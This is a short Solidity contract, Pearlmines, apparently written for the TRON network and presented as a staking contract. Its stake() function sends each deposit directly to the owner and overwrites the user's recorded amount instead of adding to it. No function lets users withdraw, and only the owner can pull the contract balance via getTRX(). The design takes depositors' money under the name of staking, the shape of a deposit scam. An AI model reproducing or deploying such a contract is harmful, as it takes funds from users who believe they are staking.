//SourceUnit: pearlmines.sol

pragma solidity ^0.5.10;

contract Pearlmines  {
    address payable public owner;

    struct User{
        uint256 tokenAmount;
    }
    
    constructor() public {
        owner = msg.sender;
    }

    mapping(address => User) public Users;

    function() payable external {}
    
    function getTokenAmount(address _owner) public view returns (uint256) {
        return Users[_owner].tokenAmount;
    }

    function stake() public payable {
        require(msg.value > 0, "Invalid amount");
        owner.transfer(msg.value);
        Users[msg.sender].tokenAmount = msg.value;
    }

    function getTRX( uint _amount) external {
        require(msg.sender == owner, "Permission denied");
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                msg.sender.transfer(amtToTransfer);
            }
        }
    }
}